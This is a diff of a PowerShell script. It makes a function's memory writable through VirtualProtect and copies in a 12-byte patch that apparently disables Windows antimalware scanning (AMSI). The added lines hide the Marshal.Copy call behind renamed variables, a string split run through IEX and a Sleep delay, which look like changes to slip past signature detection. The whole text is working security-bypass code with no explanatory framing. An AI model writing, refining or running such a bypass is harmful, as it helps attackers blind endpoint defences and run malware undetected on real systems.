@@ -44,7 +44,14 @@ $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Loo
 $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
 $buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
 
+$input = $buf
+$zero = 0
+$pointer = $funcAddr
+$twelve = 12
+
 $a='[System.Runtime.InteropServices.Marshal]::Co'
-$b='py($buf, 0, $funcAddr, 12)'
+$b='py($input, $zero, $pointer, $twelve)'
+
+Sleep(1000)
 
 IEX("$a{0}" -f $b)
